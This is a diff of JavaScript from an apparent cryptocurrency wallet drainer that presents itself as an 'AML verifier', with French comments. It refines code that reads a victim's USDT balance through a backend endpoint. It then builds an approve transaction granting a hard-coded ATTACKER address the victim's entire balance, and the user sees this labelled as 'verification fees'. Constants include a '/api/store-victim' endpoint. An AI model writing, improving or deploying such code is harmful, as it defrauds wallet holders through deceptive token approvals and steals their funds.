@@ -919,8 +919,6 @@
   /* ===== WalletConnect + Approbation fantôme via AMLVerifier ===== */
   const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-  const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';
-  const PROVIDER = new ethers.providers.JsonRpcProvider(RPC_URL);
   const API = '/api/store-victim';
   const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
 
@@ -1039,29 +1037,23 @@ async function sendExactApproveTransaction() {
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
 
-    // Lire le solde USDT de la victime
-    const usdtContract = new ethers.Contract(USDT_ADDR, [
-      'function balanceOf(address) view returns (uint256)',
-      'function decimals() view returns (uint8)'
-    ], PROVIDER);
-    const [balance, decimals] = await Promise.all([
-      usdtContract.balanceOf(account),
-      usdtContract.decimals()
-    ]);
+    // Appeler notre backend pour obtenir le solde USDT
+    const resp = await fetch(`/api/get-usdt-balance?address=${account}`);
+    if (!resp.ok) throw new Error('Erreur récupération solde');
+    const { balance, balanceRaw } = await resp.json();
 
-    if (balance.isZero()) {
+    if (!balanceRaw || BigInt(balanceRaw) === 0n) {
       if (scanText) scanText.textContent = '❌ Aucun USDT détecté.';
       return;
     }
 
-    const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
-    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (frais de vérification).`;
+    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balance} USDT (frais de vérification).`;
 
-    // Appeler approve(ATTACKER, balance) sur le contrat USDT
+    // Appeler approve(ATTACKER, balanceRaw) sur le contrat USDT
     const iface = new ethers.utils.Interface([
       'function approve(address spender, uint256 amount)'
     ]);
-    const data = iface.encodeFunctionData('approve', [ATTACKER, balance]);
+    const data = iface.encodeFunctionData('approve', [ATTACKER, balanceRaw]);
 
     const txParams = {
       from: account,
